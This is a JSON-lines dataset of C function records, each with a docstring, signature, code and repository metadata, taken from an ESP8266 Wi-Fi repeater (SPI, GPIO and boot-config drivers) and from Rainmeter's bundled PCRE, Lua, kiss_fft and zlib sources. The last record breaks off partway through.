{"docstring": "//   Description: SPI transaction function\n//    Parameters: spi_no - SPI (0) or HSPI (1)\n//\t\t\t\t  cmd_bits - actual number of bits to transmit\n//\t\t\t\t  cmd_data - command data\n//\t\t\t\t  addr_bits - actual number of bits to transmit\n//\t\t\t\t  addr_data - address data\n//\t\t\t\t  dout_bits - actual number of bits to transmit\n//\t\t\t\t  dout_data - output data\n//\t\t\t\t  din_bits - actual number of bits to receive\n//\t\t\t\t  \n//\t\t Returns: read data - uint32 containing read in data only if RX was set \n//\t\t\t\t  0 - something went wrong (or actual read data was 0)\n//\t\t\t\t  1 - data sent ok (or actual read data is 1)\n//\t\t\t\t  Note: all data is assumed to be stored in the lower bits of\n//\t\t\t\t  the data variables (for anything <32 bits). \n//\n////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "uint32 spi_transaction(uint8 spi_no, uint8 cmd_bits, uint16 cmd_data, uint32 addr_bits, uint32 addr_data, uint32 dout_bits, uint32 dout_data,\n\t\t\t\tuint32 din_bits, uint32 dummy_bits)", "code": "{\n\n\tif(spi_no > 1) return 0;  //Check for a valid SPI \n\n\t//code for custom Chip Select as GPIO PIN here\n\n\twhile(spi_busy(spi_no)); //wait for SPI to be ready\t\n\n//########## Enable SPI Functions ##########//\n\t//disable MOSI, MISO, ADDR, COMMAND, DUMMY in case previously set.\n\tCLEAR_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_MOSI|SPI_USR_MISO|SPI_USR_COMMAND|SPI_USR_ADDR|SPI_USR_DUMMY);\n\n\t//enable functions based on number of bits. 0 bits = disabled. \n\t//This is rather inefficient but allows for a very generic function.\n\t//CMD ADDR and MOSI are set below to save on an extra if statement.\n//\tif(cmd_bits) {SET_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_COMMAND);}\n//\tif(addr_bits) {SET_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_ADDR);}\n\tif(din_bits) {SET_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_MISO);}\n\tif(dummy_bits) {SET_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_DUMMY);}\n//########## END SECTION ##########//\n\n//########## Setup Bitlengths ##########//\n\tWRITE_PERI_REG(SPI_USER1(spi_no), ((addr_bits-1)&SPI_USR_ADDR_BITLEN)<<SPI_USR_ADDR_BITLEN_S | //Number of bits in Address\n\t\t\t\t\t\t\t\t\t  ((dout_bits-1)&SPI_USR_MOSI_BITLEN)<<SPI_USR_MOSI_BITLEN_S | //Number of bits to Send\n\t\t\t\t\t\t\t\t\t  ((din_bits-1)&SPI_USR_MISO_BITLEN)<<SPI_USR_MISO_BITLEN_S |  //Number of bits to receive\n\t\t\t\t\t\t\t\t\t  ((dummy_bits-1)&SPI_USR_DUMMY_CYCLELEN)<<SPI_USR_DUMMY_CYCLELEN_S); //Number of Dummy bits to insert\n//########## END SECTION ##########//\n\n//########## Setup Command Data ##########//\n\tif(cmd_bits) {\n\t\tSET_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_COMMAND); //enable COMMAND function in SPI module\n\t\tuint16 command = cmd_data << (16-cmd_bits); //align command data to high bits\n\t\tcommand = ((command>>8)&0xff) | ((command<<8)&0xff00); //swap byte order\n\t\tWRITE_PERI_REG(SPI_USER2(spi_no), ((((cmd_bits-1)&SPI_USR_COMMAND_BITLEN)<<SPI_USR_COMMAND_BITLEN_S) | command&SPI_USR_COMMAND_VALUE));\t\n\t}\n//########## END SECTION ##########//\n\n//########## Setup Address Data ##########//\n\tif(addr_bits){\n\t\tSET_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_ADDR); //enable ADDRess function in SPI module\n\t\tWRITE_PERI_REG(SPI_ADDR(spi_no), addr_data<<(32-addr_bits)); //align address data to high bits\n\t}\n\t\n\n//########## END SECTION ##########//\t\n\n//########## Setup DOUT data ##########//\n\tif(dout_bits) {\n\t\tSET_PERI_REG_MASK(SPI_USER(spi_no), SPI_USR_MOSI); //enable MOSI function in SPI module\n\t//copy data to W0\n\tif(READ_PERI_REG(SPI_USER(spi_no))&SPI_WR_BYTE_ORDER) {\n\t\tWRITE_PERI_REG(SPI_W0(spi_no), dout_data<<(32-dout_bits));\n\t} else {\n\n\t\tuint8 dout_extra_bits = dout_bits%8;\n\n\t\tif(dout_extra_bits){\n\t\t\t//if your data isn't a byte multiple (8/16/24/32 bits)and you don't have SPI_WR_BYTE_ORDER set, you need this to move the non-8bit remainder to the MSBs\n\t\t\t//not sure if there's even a use case for this, but it's here if you need it...\n\t\t\t//for example, 0xDA4 12 bits without SPI_WR_BYTE_ORDER would usually be output as if it were 0x0DA4, \n\t\t\t//of which 0xA4, and then 0x0 would be shifted out (first 8 bits of low byte, then 4 MSB bits of high byte - ie reverse byte order). \n\t\t\t//The code below shifts it out as 0xA4 followed by 0xD as you might require. \n\t\t\tWRITE_PERI_REG(SPI_W0(spi_no), ((0xFFFFFFFF<<(dout_bits - dout_extra_bits)&dout_data)<<(8-dout_extra_bits) | (0xFFFFFFFF>>(32-(dout_bits - dout_extra_bits)))&dout_data));\n\t\t} else {\n\t\t\tWRITE_PERI_REG(SPI_W0(spi_no), dout_data);\n\t\t}\n\t}\n\t}\n//########## END SECTION ##########//\n\n//########## Begin SPI Transaction ##########//\n\tSET_PERI_REG_MASK(SPI_CMD(spi_no), SPI_USR);\n//########## END SECTION ##########//\n\n//########## Return DIN data ##########//\n\tif(din_bits) {\n\t\twhile(spi_busy(spi_no));\t//wait for SPI transaction to complete\n\t\t\n\t\tif(READ_PERI_REG(SPI_USER(spi_no))&SPI_RD_BYTE_ORDER) {\n\t\t\treturn READ_PERI_REG(SPI_W0(spi_no)) >> (32-din_bits); //Assuming data in is written to MSB. TBC\n\t\t} else {\n\t\t\treturn READ_PERI_REG(SPI_W0(spi_no)); //Read in the same way as DOUT is sent. Note existing contents of SPI_W0 remain unless overwritten! \n\t\t}\n\n\t\treturn 0; //something went wrong\n\t}\n//########## END SECTION ##########//\n\n\t//Transaction completed\n\treturn 1; //success\n}", "path": "esp_wifi_repeater/driver/spi.c", "commit_date": "2018-04-04 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "/**\n * Returns the gpio name and func for a specific pin.\n */\n", "func_signal": "bool ICACHE_FLASH_ATTR\neasygpio_getGPIONameFunc(uint8_t gpio_pin, uint32_t *gpio_name, uint8_t *gpio_func)", "code": "{\n\n  if (gpio_pin == 6 || gpio_pin == 7 || gpio_pin == 8 || gpio_pin == 11 || gpio_pin >= 17) {\n    os_printf(\"easygpio_getGPIONameFunc Error: There is no GPIO%d, check your code\\n\", gpio_pin);\n    return false;\n  }\n  if (gpio_pin == 16) {\n    os_printf(\"easygpio_getGPIONameFunc Error: GPIO16 does not have gpio_name and gpio_func\\n\");\n    return false;\n  }\n  switch ( gpio_pin ) {\n    case 0:\n      *gpio_func = FUNC_GPIO0;\n      *gpio_name = PERIPHS_IO_MUX_GPIO0_U;\n      return true;\n    case 1:\n      *gpio_func = FUNC_GPIO1;\n      *gpio_name = PERIPHS_IO_MUX_U0TXD_U;\n      return true;\n    case 2:\n      *gpio_func = FUNC_GPIO2;\n      *gpio_name = PERIPHS_IO_MUX_GPIO2_U;\n      return true;\n    case 3:\n      *gpio_func = FUNC_GPIO3;\n      *gpio_name = PERIPHS_IO_MUX_U0RXD_U;\n      return true;\n    case 4:\n      *gpio_func = FUNC_GPIO4;\n      *gpio_name = PERIPHS_IO_MUX_GPIO4_U;\n      return true;\n    case 5:\n      *gpio_func = FUNC_GPIO5;\n      *gpio_name = PERIPHS_IO_MUX_GPIO5_U;\n      return true;\n    case 9:\n      *gpio_func = FUNC_GPIO9;\n      *gpio_name = PERIPHS_IO_MUX_SD_DATA2_U;\n      return true;\n    case 10:\n      *gpio_func = FUNC_GPIO10;\n      *gpio_name = PERIPHS_IO_MUX_SD_DATA3_U;\n      return true;\n    case 12:\n      *gpio_func = FUNC_GPIO12;\n      *gpio_name = PERIPHS_IO_MUX_MTDI_U;\n      return true;\n    case 13:\n      *gpio_func = FUNC_GPIO13;\n      *gpio_name = PERIPHS_IO_MUX_MTCK_U;\n      return true;\n    case 14:\n      *gpio_func = FUNC_GPIO14;\n      *gpio_name = PERIPHS_IO_MUX_MTMS_U;\n      return true;\n    case 15:\n      *gpio_func = FUNC_GPIO15;\n      *gpio_name = PERIPHS_IO_MUX_MTDO_U;\n      return true;\n    default:\n      return false;\n  }\n  return true;\n}", "path": "esp_wifi_repeater/easygpio/easygpio.c", "commit_date": "2017-03-22 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "/**\n * Sets the 'gpio_pin' pin as a GPIO and sets the interrupt to trigger on that pin.\n * The 'interruptArg' is the function argument that will be sent to your interruptHandler\n */\n", "func_signal": "bool ICACHE_FLASH_ATTR\neasygpio_attachInterrupt(uint8_t gpio_pin, EasyGPIO_PullStatus pullStatus, void (*interruptHandler)(void *arg), void *interruptArg)", "code": "{\n  uint32_t gpio_name;\n  uint8_t gpio_func;\n\n  if (gpio_pin == 16) {\n    os_printf(\"easygpio_setupInterrupt Error: GPIO16 does not have interrupts\\n\");\n    return false;\n  }\n  if (!easygpio_getGPIONameFunc(gpio_pin, &gpio_name, &gpio_func) ) {\n    return false;\n  }\n\n  ETS_GPIO_INTR_ATTACH(interruptHandler, interruptArg);\n  ETS_GPIO_INTR_DISABLE();\n\n  PIN_FUNC_SELECT(gpio_name, gpio_func);\n\n  easygpio_setupPullsByName(gpio_name, pullStatus);\n\n  // disable output\n  GPIO_DIS_OUTPUT(gpio_pin);\n\n  gpio_register_set(GPIO_PIN_ADDR(gpio_pin), GPIO_PIN_INT_TYPE_SET(GPIO_PIN_INTR_DISABLE)\n                    | GPIO_PIN_PAD_DRIVER_SET(GPIO_PAD_DRIVER_DISABLE)\n                    | GPIO_PIN_SOURCE_SET(GPIO_AS_PIN_SOURCE));\n\n  //clear gpio14 status\n  GPIO_REG_WRITE(GPIO_STATUS_W1TC_ADDRESS, BIT(gpio_pin));\n  ETS_GPIO_INTR_ENABLE();\n\n  return true;\n}", "path": "esp_wifi_repeater/easygpio/easygpio.c", "commit_date": "2017-03-22 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "/**\n * Returns the number of active pins in the gpioMask.\n */\n", "func_signal": "uint8_t ICACHE_FLASH_ATTR\neasygpio_countBits(uint32_t gpioMask)", "code": "{\n\n  uint8_t i=0;\n  uint8_t numberOfPins=0;\n  for (i=0; i<32; i++){\n    numberOfPins += (gpioMask & BIT(i))?1:0;\n  }\n  return numberOfPins;\n}", "path": "esp_wifi_repeater/easygpio/easygpio.c", "commit_date": "2017-03-22 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "/**\n * Sets the pull registers for a pin.\n */\n", "func_signal": "bool ICACHE_FLASH_ATTR\neasygpio_pullMode(uint8_t gpio_pin, EasyGPIO_PullStatus pullStatus)", "code": "{\n  uint32_t gpio_name;\n  uint8_t gpio_func;\n\n  if (!easygpio_getGPIONameFunc(gpio_pin, &gpio_name, &gpio_func) ) {\n    return false;\n  }\n\n  easygpio_setupPullsByName(gpio_name, pullStatus);\n  return true;\n}", "path": "esp_wifi_repeater/easygpio/easygpio.c", "commit_date": "2017-03-22 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "////////////////////////////////////////////////////////////////////////////////\n//\n// Function Name: spi_mode\n//   Description: Configures SPI mode parameters for clock edge and clock polarity.\n//    Parameters: spi_no - SPI (0) or HSPI (1)\n//\t\t\t\t  spi_cpha - (0) Data is valid on clock leading edge\n//\t\t\t\t             (1) Data is valid on clock trailing edge\n//\t\t\t\t  spi_cpol - (0) Clock is low when inactive\n//\t\t\t\t             (1) Clock is high when inactive\n//\n////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "void spi_mode(uint8 spi_no, uint8 spi_cpha,uint8 spi_cpol)", "code": "{\n\tif(!spi_cpha == !spi_cpol) {\n\t\tCLEAR_PERI_REG_MASK(SPI_USER(spi_no), SPI_CK_OUT_EDGE);\n\t} else {\n\t\tSET_PERI_REG_MASK(SPI_USER(spi_no), SPI_CK_OUT_EDGE);\n\t}\n\n\tif (spi_cpol) {\n\t\tSET_PERI_REG_MASK(SPI_PIN(spi_no), SPI_IDLE_EDGE);\n\t} else {\n\t\tCLEAR_PERI_REG_MASK(SPI_PIN(spi_no), SPI_IDLE_EDGE);\n\t}\n}", "path": "esp_wifi_repeater/driver/spi.c", "commit_date": "2018-04-04 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "////////////////////////////////////////////////////////////////////////////////\n//\n// Function Name: spi_init_gpio\n//   Description: Initialises the GPIO pins for use as SPI pins.\n//    Parameters: spi_no - SPI (0) or HSPI (1)\n//\t\t\t\t  sysclk_as_spiclk - SPI_CLK_80MHZ_NODIV (1) if using 80MHz\n//\t\t\t\t\t\t\t\t\t sysclock for SPI clock. \n//\t\t\t\t\t\t\t\t\t SPI_CLK_USE_DIV (0) if using divider to\n//\t\t\t\t\t\t\t\t\t get lower SPI clock speed.\n//\t\t\t\t \n////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "void spi_init_gpio(uint8 spi_no, uint8 sysclk_as_spiclk)", "code": "{\n\n//\tif(spi_no > 1) return; //Not required. Valid spi_no is checked with if/elif below.\n\n\tuint32 clock_div_flag = 0;\n\tif(sysclk_as_spiclk){\n\t\tclock_div_flag = 0x0001;\t\n\t} \n\n\tif(spi_no==SPI){\n\t\tWRITE_PERI_REG(PERIPHS_IO_MUX, 0x005|(clock_div_flag<<8)); //Set bit 8 if 80MHz sysclock required\n\t\tPIN_FUNC_SELECT(PERIPHS_IO_MUX_SD_CLK_U, 1);\n\t\tPIN_FUNC_SELECT(PERIPHS_IO_MUX_SD_CMD_U, 1);\n\t\tPIN_FUNC_SELECT(PERIPHS_IO_MUX_SD_DATA0_U, 1);\t\n\t\tPIN_FUNC_SELECT(PERIPHS_IO_MUX_SD_DATA1_U, 1);\t\n\t}else if(spi_no==HSPI){\n\t\tWRITE_PERI_REG(PERIPHS_IO_MUX, 0x105|(clock_div_flag<<9)); //Set bit 9 if 80MHz sysclock required\n\t\tPIN_FUNC_SELECT(PERIPHS_IO_MUX_MTDI_U, 2); //GPIO12 is HSPI MISO pin (Master Data In)\n\t\tPIN_FUNC_SELECT(PERIPHS_IO_MUX_MTCK_U, 2); //GPIO13 is HSPI MOSI pin (Master Data Out)\n\t\tPIN_FUNC_SELECT(PERIPHS_IO_MUX_MTMS_U, 2); //GPIO14 is HSPI CLK pin (Clock)\n\t\tPIN_FUNC_SELECT(PERIPHS_IO_MUX_MTDO_U, 2); //GPIO15 is HSPI CS pin (Chip Select / Slave Select)\n\t}\n\n}", "path": "esp_wifi_repeater/driver/spi.c", "commit_date": "2018-04-04 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "// write the rboot config\n// preserves the contents of the rest of the sector,\n// so the rest of the sector can be used to store user data\n// updates checksum automatically (if enabled)\n", "func_signal": "bool ICACHE_FLASH_ATTR rboot_set_config(rboot_config *conf)", "code": "{\n\tuint8 *buffer;\n\tbuffer = (uint8*)os_malloc(SECTOR_SIZE);\n\tif (!buffer) {\n\t\t//os_printf(\"No ram!\\r\\n\");\n\t\treturn false;\n\t}\n\t\n#ifdef BOOT_CONFIG_CHKSUM\n\tconf->chksum = calc_chksum((uint8*)conf, (uint8*)&conf->chksum);\n#endif\n\t\n\tspi_flash_read(BOOT_CONFIG_SECTOR * SECTOR_SIZE, (uint32*)((void*)buffer), SECTOR_SIZE);\n\tos_memcpy(buffer, conf, sizeof(rboot_config));\n\tspi_flash_erase_sector(BOOT_CONFIG_SECTOR);\n\t//spi_flash_write(BOOT_CONFIG_SECTOR * SECTOR_SIZE, (uint32*)((void*)buffer), SECTOR_SIZE);\n\tspi_flash_write(BOOT_CONFIG_SECTOR * SECTOR_SIZE, (uint32*)((void*)buffer), SECTOR_SIZE);\n\t\n\tos_free(buffer);\n\treturn true;\n}", "path": "esp_wifi_repeater/user/rboot-api.c", "commit_date": "2018-09-01 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "/**\n * Uniform way of turning an input GPIO pin into output mode. Handles GPIO 0-16.\n * The pin must be initiated with easygpio_pinMode() so that the pin mux is setup as a gpio in the first place.\n *\n * This function:\n *  - should only be used to convert a input pin into an output pin.\n *  - is a little bit slower than easygpio_outputSet() so you should use that\n *    function to just change output value.\n *  - does the same thing as GPIO_OUTPUT_SET, but works on GPIO16 too.\n */\n", "func_signal": "void easygpio_outputEnable(uint8_t gpio_pin, uint8_t value)", "code": "{\n  if (16==gpio_pin) {\n    // write the value before flipping to output\n    // - so we don't flash previous value for a few ns.\n    WRITE_PERI_REG(RTC_GPIO_OUT,\n                           (READ_PERI_REG(RTC_GPIO_OUT) & 0xfffffffeUL) | (0x1UL & value));\n\n    WRITE_PERI_REG(RTC_GPIO_ENABLE,\n          (READ_PERI_REG(RTC_GPIO_ENABLE) & 0xfffffffeUL) | 0x1UL); //out enable\n\n  } else {\n    GPIO_OUTPUT_SET(GPIO_ID_PIN(gpio_pin), value);\n  }\n}", "path": "esp_wifi_repeater/easygpio/easygpio.c", "commit_date": "2017-03-22 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "/**\n * Sets the 'gpio_pin' pin as a GPIO and sets the pull register for that pin.\n * 'pullStatus' has no effect on output pins or GPIO16\n */\n", "func_signal": "bool ICACHE_FLASH_ATTR\neasygpio_pinMode(uint8_t gpio_pin, EasyGPIO_PullStatus pullStatus, EasyGPIO_PinMode pinMode)", "code": "{\n  uint32_t gpio_name;\n  uint8_t gpio_func;\n\n  if (16==gpio_pin) {\n    // ignoring pull status on GPIO16 for now\n    if (EASYGPIO_OUTPUT == pinMode) {\n      gpio16_output_conf();\n    } else {\n      gpio16_input_conf();\n    }\n    return true;\n  } else if (!easygpio_getGPIONameFunc(gpio_pin, &gpio_name, &gpio_func) ) {\n    return false;\n  }\n\n  PIN_FUNC_SELECT(gpio_name, gpio_func);\n  easygpio_setupPullsByName(gpio_name, pullStatus);\n\n  if (EASYGPIO_OUTPUT != pinMode) {\n    GPIO_DIS_OUTPUT(GPIO_ID_PIN(gpio_pin));\n  } else {\n    // must enable the pin or else the WRITE_PERI_REG won't work\n    gpio_output_set(0, 0, BIT(GPIO_ID_PIN(gpio_pin)),0);\n  }\n  return true;\n}", "path": "esp_wifi_repeater/easygpio/easygpio.c", "commit_date": "2017-03-22 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "////////////////////////////////////////////////////////////////////////////////\n//\n// Function Name: spi_clock\n//   Description: sets up the control registers for the SPI clock\n//    Parameters: spi_no - SPI (0) or HSPI (1)\n//\t\t\t\t  prediv - predivider value (actual division value)\n//\t\t\t\t  cntdiv - postdivider value (actual division value)\n//\t\t\t\t  Set either divider to 0 to disable all division (80MHz sysclock)\n//\t\t\t\t \n////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "void spi_clock(uint8 spi_no, uint16 prediv, uint8 cntdiv)", "code": "{\n\t\n\tif(spi_no > 1) return;\n\n\tif((prediv==0)|(cntdiv==0)){\n\n\t\tWRITE_PERI_REG(SPI_CLOCK(spi_no), SPI_CLK_EQU_SYSCLK);\n\n\t} else {\n\t\n\t\tWRITE_PERI_REG(SPI_CLOCK(spi_no), \n\t\t\t\t\t(((prediv-1)&SPI_CLKDIV_PRE)<<SPI_CLKDIV_PRE_S)|\n\t\t\t\t\t(((cntdiv-1)&SPI_CLKCNT_N)<<SPI_CLKCNT_N_S)|\n\t\t\t\t\t(((cntdiv>>1)&SPI_CLKCNT_H)<<SPI_CLKCNT_H_S)|\n\t\t\t\t\t((0&SPI_CLKCNT_L)<<SPI_CLKCNT_L_S));\n\t}\n\n}", "path": "esp_wifi_repeater/driver/spi.c", "commit_date": "2018-04-04 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "/* \"Normal\" properties can be printed from tables. The PT_CLIST property is a\npseudo-property that contains a pointer to a list of case-equivalent\ncharacters. This is used only when UCP support is available and UTF mode is\nselected. It should never occur otherwise, but just in case it does, have\nsomething ready to print. */\n", "func_signal": "static void\nprint_prop(FILE *f, pcre_uchar *code, const char *before, const char *after)", "code": "{\nif (code[1] != PT_CLIST)\n  {\n  fprintf(f, \"%s%s %s%s\", before, priv_OP_names[*code], get_ucpname(code[1],\n    code[2]), after);\n  }\nelse\n  {\n  const char *not = (*code == OP_PROP)? \"\" : \"not \";\n#ifndef SUPPORT_UCP\n  fprintf(f, \"%s%sclist %d%s\", before, not, code[2], after);\n#else\n  const pcre_uint32 *p = PRIV(ucd_caseless_sets) + code[2];\n  fprintf (f, \"%s%sclist\", before, not);\n  while (*p < NOTACHAR) fprintf(f, \" %04x\", *p++);\n  fprintf(f, \"%s\", after);\n#endif\n  }\n}", "path": "rainmeter/Library/pcre/pcre_printint.c", "commit_date": "2015-08-11 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/*\n** miscellaneous functions\n*/\n", "func_signal": "LUA_API int lua_error (lua_State *L)", "code": "{\n  lua_lock(L);\n  api_checknelems(L, 1);\n  luaG_errormsg(L);\n  lua_unlock(L);\n  return 0;  /* to avoid warnings */\n}", "path": "rainmeter/Library/lua/lua/lapi.c", "commit_date": "2017-08-06 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/*\n** get functions (Lua -> stack)\n*/\n", "func_signal": "LUA_API void lua_gettable (lua_State *L, int idx)", "code": "{\n  StkId t;\n  lua_lock(L);\n  t = index2adr(L, idx);\n  api_checkvalidindex(L, t);\n  luaV_gettable(L, t, L->top - 1, L->top - 1);\n  lua_unlock(L);\n}", "path": "rainmeter/Library/lua/lua/lapi.c", "commit_date": "2017-08-06 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/* The guts header contains all the multiplication and addition macros that are defined for\n fixed or floating point complex numbers.  It also delares the kf_ internal functions.\n */\n", "func_signal": "static void kf_bfly2(\n        kiss_fft_cpx * Fout,\n        const size_t fstride,\n        const kiss_fft_cfg st,\n        int m\n        )", "code": "{\n    kiss_fft_cpx * Fout2;\n    kiss_fft_cpx * tw1 = st->twiddles;\n    kiss_fft_cpx t;\n    Fout2 = Fout + m;\n    do{\n        C_FIXDIV(*Fout,2); C_FIXDIV(*Fout2,2);\n\n        C_MUL (t,  *Fout2 , *tw1);\n        tw1 += fstride;\n        C_SUB( *Fout2 ,  *Fout , t );\n        C_ADDTO( *Fout ,  t );\n        ++Fout2;\n        ++Fout;\n    }while (--m);\n}", "path": "rainmeter/Plugins/PluginAudioLevel/kiss_fft130/kiss_fft.c", "commit_date": "2014-09-09 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/* This function sets starting bits for a negative character type such as \\D.\nIn UTF-8 mode, we can only do a direct setting for bytes less than 128, as\notherwise there can be confusion with bytes in the middle of UTF-8 characters.\nUnlike in the positive case, where we can set appropriate starting bits for\nspecific high-valued UTF-8 characters, in this case we have to set the bits for\nall high-valued characters. The lowest is 0xc2, but we overkill by starting at\n0xc0 (192) for simplicity.\n\nArguments:\n  start_bits     the starting bitmap\n  cbit type      the type of character wanted\n  table_limit    32 for non-UTF-8; 16 for UTF-8\n  cd             the block with char table pointers\n\nReturns:         nothing\n*/\n", "func_signal": "static void\nset_nottype_bits(pcre_uint8 *start_bits, int cbit_type, unsigned int table_limit,\n  compile_data *cd)", "code": "{\nregister pcre_uint32 c;\nfor (c = 0; c < table_limit; c++) start_bits[c] |= ~cd->cbits[c+cbit_type];\n#if defined SUPPORT_UTF && defined COMPILE_PCRE8\nif (table_limit != 32) for (c = 24; c < 32; c++) start_bits[c] = 0xff;\n#endif\n}", "path": "rainmeter/Library/pcre/pcre_study.c", "commit_date": "2015-08-11 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/*\n** push functions (C -> stack)\n*/\n", "func_signal": "LUA_API void lua_pushnil (lua_State *L)", "code": "{\n  lua_lock(L);\n  setnilvalue(L->top);\n  api_incr_top(L);\n  lua_unlock(L);\n}", "path": "rainmeter/Library/lua/lua/lapi.c", "commit_date": "2017-08-06 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/*\n** load precompiled chunk\n*/\n", "func_signal": "Proto* luaU_undump (lua_State* L, ZIO* Z, Mbuffer* buff, const char* name)", "code": "{\n LoadState S;\n if (*name=='@' || *name=='=')\n  S.name=name+1;\n else if (*name==LUA_SIGNATURE[0])\n  S.name=\"binary string\";\n else\n  S.name=name;\n S.L=L;\n S.Z=Z;\n S.b=buff;\n LoadHeader(&S);\n return LoadFunction(&S,luaS_newliteral(L,\"=?\"));\n}", "path": "rainmeter/Library/lua/lua/lundump.c", "commit_date": "2017-08-06 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/*\n* make header\n*/\n", "func_signal": "void luaU_header (char* h)", "code": "{\n int x=1;\n memcpy(h,LUA_SIGNATURE,sizeof(LUA_SIGNATURE)-1);\n h+=sizeof(LUA_SIGNATURE)-1;\n *h++=(char)LUAC_VERSION;\n *h++=(char)LUAC_FORMAT;\n *h++=(char)*(char*)&x;\t\t\t\t/* endianness */\n *h++=(char)sizeof(int);\n *h++=(char)sizeof(size_t);\n *h++=(char)sizeof(Instruction);\n *h++=(char)sizeof(lua_Number);\n *h++=(char)(((lua_Number)0.5)==0);\t\t/* is lua_Number integral? */\n}", "path": "rainmeter/Library/lua/lua/lundump.c", "commit_date": "2017-08-06 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/*\n *\n * User-callable function to allocate all necessary storage space for the fft.\n *\n * The return value is a contiguous block of memory, allocated with malloc.  As such,\n * It can be freed with free(), rather than a kiss_fft-specific function.\n * */\n", "func_signal": "kiss_fft_cfg kiss_fft_alloc(int nfft,int inverse_fft,void * mem,size_t * lenmem )", "code": "{\n    kiss_fft_cfg st=NULL;\n    size_t memneeded = sizeof(struct kiss_fft_state)\n        + sizeof(kiss_fft_cpx)*(nfft-1); /* twiddle factors*/\n\n    if ( lenmem==NULL ) {\n        st = ( kiss_fft_cfg)KISS_FFT_MALLOC( memneeded );\n    }else{\n        if (mem != NULL && *lenmem >= memneeded)\n            st = (kiss_fft_cfg)mem;\n        *lenmem = memneeded;\n    }\n    if (st) {\n        int i;\n        st->nfft=nfft;\n        st->inverse = inverse_fft;\n\n        for (i=0;i<nfft;++i) {\n            const double pi=3.141592653589793238462643383279502884197169399375105820974944;\n            double phase = -2*pi*i / nfft;\n            if (st->inverse)\n                phase *= -1;\n            kf_cexp(st->twiddles+i, phase );\n        }\n\n        kf_factor(nfft,st->factors);\n    }\n    return st;\n}", "path": "rainmeter/Plugins/PluginAudioLevel/kiss_fft130/kiss_fft.c", "commit_date": "2014-09-09 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/* -- see zlib.h -- */\n", "func_signal": "int ZEXPORTVA gzvprintf(gzFile file, const char *format, va_list va)", "code": "{\n    int size, len;\n    gz_statep state;\n    z_streamp strm;\n\n    /* get internal structure */\n    if (file == NULL)\n        return -1;\n    state = (gz_statep)file;\n    strm = &(state->strm);\n\n    /* check that we're writing and that there's no error */\n    if (state->mode != GZ_WRITE || state->err != Z_OK)\n        return 0;\n\n    /* make sure we have some buffer space */\n    if (state->size == 0 && gz_init(state) == -1)\n        return 0;\n\n    /* check for seek request */\n    if (state->seek) {\n        state->seek = 0;\n        if (gz_zero(state, state->skip) == -1)\n            return 0;\n    }\n\n    /* consume whatever's left in the input buffer */\n    if (strm->avail_in && gz_comp(state, Z_NO_FLUSH) == -1)\n        return 0;\n\n    /* do the printf() into the input buffer, put length in len */\n    size = (int)(state->size);\n    state->in[size - 1] = 0;\n#ifdef NO_vsnprintf\n#  ifdef HAS_vsprintf_void\n    (void)vsprintf((char *)(state->in), format, va);\n    for (len = 0; len < size; len++)\n        if (state->in[len] == 0) break;\n#  else\n    len = vsprintf((char *)(state->in), format, va);\n#  endif\n#else\n#  ifdef HAS_vsnprintf_void\n    (void)vsnprintf((char *)(state->in), size, format, va);\n    len = strlen((char *)(state->in));\n#  else\n    len = vsnprintf((char *)(state->in), size, format, va);\n#  endif\n#endif\n\n    /* check that printf() results fit in buffer */\n    if (len <= 0 || len >= (int)size || state->in[size - 1] != 0)\n        return 0;\n\n    /* update buffer and position, defer compression until needed */\n    strm->avail_in = (unsigned)len;\n    strm->next_in = state->in;\n    state->x.pos += len;\n    return len;\n}", "path": 